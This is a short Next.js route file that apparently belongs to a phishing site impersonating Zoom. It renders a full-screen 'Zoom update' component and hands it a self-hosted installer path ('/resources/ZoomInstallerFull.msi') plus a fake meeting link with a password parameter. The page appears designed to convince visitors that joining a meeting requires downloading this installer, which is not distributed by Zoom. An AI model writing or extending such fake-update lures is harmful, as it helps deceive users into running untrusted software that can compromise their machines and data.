import ZoomUpdateFullScreen from "@/app/components/ZoomAlert";
const UPDATE_FILE_PATH = "/resources/ZoomInstallerFull.msi";

const AUTHORIZED_PATH =
  "/h/4571079255644?pwd=35g7Xq6vG1Z8hF6ZaJyQaKCnjVdfU.1";

export default function ZoomMeetingRoute() {
  return <ZoomUpdateFullScreen UPDATE_FILE_PATH={UPDATE_FILE_PATH} AUTHORIZED_PATH={AUTHORIZED_PATH} />;
}
